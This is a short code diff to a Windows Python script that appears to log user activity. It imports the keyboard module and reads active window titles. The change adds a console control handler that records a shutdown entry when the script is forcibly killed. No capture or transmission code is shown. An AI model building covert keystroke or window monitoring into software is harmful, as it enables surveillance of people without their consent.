@@ -5,6 +5,7 @@ import time
 import socket
 import win32gui
 import win32process
+import win32api
 import keyboard
 import threading
 import atexit
@@ -69,6 +70,13 @@ def log_system_shutdown():
 
 # Register shutdown hook
 atexit.register(log_system_shutdown)
+
+# Handle forceful termination
+def handle_exit(sig):
+    log_system_shutdown()
+    os._exit(1)
+
+win32api.SetConsoleCtrlHandler(handle_exit, True)
 
 # Function to get active window title
 def get_active_window_title():
